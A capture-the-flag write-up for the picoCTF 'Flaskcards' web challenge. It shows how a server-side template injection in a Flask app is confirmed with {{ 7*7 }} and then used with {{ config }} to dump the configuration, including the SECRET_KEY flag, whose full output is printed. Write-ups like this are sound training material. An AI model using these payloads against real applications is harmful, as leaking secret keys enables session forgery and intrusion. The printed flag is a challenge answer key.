# Flaskcards - Web

We are given a webpage where we first register an account and then we have the ability to create cards and view those created cards. After trying some different input, and thinking about the challenge title we figured out this is a SSTI problem and that Flask is used as backend.

This can be confirmed by entering

> {{ 7*7}}

This gives us 49 so it is executed on the backend. Then we can input 
> {{ config }}

><Config {'SQLALCHEMY_COMMIT_ON_TEARDOWN': False, 'SQLALCHEMY_TRACK_MODIFICATIONS': False, 'DEBUG': False, 'MAX_COOKIE_SIZE': >4093, 'TEMPLATES_AUTO_RELOAD': None, 'PREFERRED_URL_SCHEME': 'http', 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, >43200), 'SESSION_COOKIE_NAME': 'session', 'SQLALCHEMY_POOL_RECYCLE': None, 'SESSION_COOKIE_SAMESITE': None, >'TRAP_BAD_REQUEST_ERRORS': None, 'SECRET_KEY': 'picoCTF{secret_keys_to_the_kingdom_e8a55760}', 'JSON_SORT_KEYS': True, >'SQLALCHEMY_POOL_SIZE': None, 'SERVER_NAME': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'TESTING': False, >'SQLALCHEMY_MAX_OVERFLOW': None, 'JSON_AS_ASCII': True, 'USE_X_SENDFILE': False, 'SQLALCHEMY_BINDS': None, >'BOOTSTRAP_QUERYSTRING_REVVING': True, 'BOOTSTRAP_SERVE_LOCAL': False, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), >'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'JSONIFY_MIMETYPE': 'application/json', 'BOOTSTRAP_LOCAL_SUBDOMAIN': None, >'PROPAGATE_EXCEPTIONS': None, 'APPLICATION_ROOT': '/', 'MAX_CONTENT_LENGTH': None, 'ENV': 'production', >'EXPLAIN_TEMPLATE_LOADING': False, 'SESSION_COOKIE_HTTPONLY': True, 'SQLALCHEMY_NATIVE_UNICODE': None, >'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_DOMAIN': False, 'SQLALCHEMY_DATABASE_URI': 'sqlite://', >'BOOTSTRAP_CDN_FORCE_SSL': False, 'SQLALCHEMY_ECHO': False, 'TRAP_HTTP_EXCEPTIONS': False, 'SQLALCHEMY_POOL_TIMEOUT': None, >'BOOTSTRAP_USE_MINIFIED': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'SQLALCHEMY_RECORD_QUERIES': None, >'SESSION_COOKIE_PATH': None}>

Boom! We have the flag: picoCTF{secret_keys_to_the_kingdom_e8a55760}
